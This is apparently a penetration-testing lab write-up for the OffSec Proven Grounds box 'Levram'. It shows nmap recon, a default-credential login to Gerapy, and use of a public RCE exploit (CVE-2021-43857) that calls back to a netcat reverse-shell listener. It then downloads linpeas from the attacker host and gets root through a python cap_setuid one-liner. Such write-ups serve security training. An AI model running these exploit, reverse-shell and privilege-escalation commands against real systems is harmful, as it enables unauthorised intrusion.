# Levram - Linux - OffSec - Proven Grounds
Completed: July 15, 2026 - 1 hr

- Box location: https://portal.offsec.com/machine/levram-50411/overview/details 
- References:
- https://www.youtube.com/watch?v=m68J93kudos

## Workflow
### Inital Recon
```
nmap -sC -sV -oN inital-nmap 192.168.146.24
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What's Hosted on Port 8000 - search via burp proxy
When reaching the site `192.168.146.24:8000` it goes to a login page. I went ahead and tried `admin:admin` and it was a valid username and password.
Within the application it's important to check out all site information. From the screenshot below the important things to search for is the Gerapy version. A quick search shows that there is a known exploit for `Gerapy 0.9.7`.

<img width="999" height="597" alt="image" src="https://github.com/user-attachments/assets/880cc7cf-2a6a-48ea-a0eb-4fa41ca5ef59" />

### Gerapy RCE - CVE-2021-43857
https://www.exploit-db.com/exploits/50640

```
searchsploit Gerapy
searchsploit -m 50640.py

# One one terminal
nc -lnvp 9001

# Other terminal 
python3 50640.py 50640.py -t http://192.168.146.24 -p 8000 -L 192.168.45.208 -P 9001
```
An error comes back up when running the exploit without creating a project. So I went ahead and created a project and reran the exploit and got a shell.
<img width="680" height="260" alt="image" src="https://github.com/user-attachments/assets/eab6b0cd-28f9-4dba-b1ab-a72ef277c187" />
```
app@ubuntu:~/gerapy$ id 
id 
uid=1000(app) gid=1000(app) groups=1000(app)
app@ubuntu:~/gerapy$ whoami
app
app@ubuntu:~$ cd ../
app@ubuntu:~$ cat local.txt
cat local.txt
be5743a40d69fa073b4955828037fe7a
```
### Privesc to Root (Automated) 
While conducting mannual recon, we can try to run linpeas (automated linux recon tool).
With linpeas, usually red/orange are indicators to look out for. 
In this case, linpeas does show that there is a linux binary capability `CAP_SETUID`. 
```
# On attacker terminal (terminal #1)
# have a http server open where linpeas script is to server files to any machine on this network from this directory. In this case, I chose port 8000 but can usually be any high number port available. 
┌──(kali㉿kali)-[~/tools]
-rwxrwxr-x  1 kali kali 1090032 Jul 15 02:21 linpeas.sh
python3 -m http.server 8000

# On shell session, in tmp or user home directory 
app@ubuntu:~$ wget http://192.168.45.208:8000/linpeas.sh
app@ubuntu:~$ chmod u+x linpeas.sh
app@ubuntu:~$ ./linpeas.sh

...
# linpeas results show: 
Capabilities
/usr/bin/python3.10 cap_setuid=ep
```
<img width="885" height="128" alt="image" src="https://github.com/user-attachments/assets/0b48a5bb-5f2c-44e3-9ed0-c76fdff419b7" />

```
# check machine shell session
app@ubuntu:~$ which python3.10
/usr/bin/python3.10
# python with cap_setuid+ep - spawns a bash shell with root privileges
app@ubuntu:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
root
/bin/bash -i
root@ubuntu:~# ls
...
root@ubuntu:~# cd /root 
root@ubuntu:~# ls
...
root@ubuntu:/root# cat proof.txt
cat proof.txt
d7a347c050bfbc17f2af452132b87a32
```
### Privesc to Root (Manual check)
```
# Searching for exploitable capabilities
# cap_setuid+ep - Can change UID
app@ubuntu:~$ getcap -r / 2>/dev/null
...
/usr/bin/python3.10 cap_setuid=ep
_do the same as above_
```
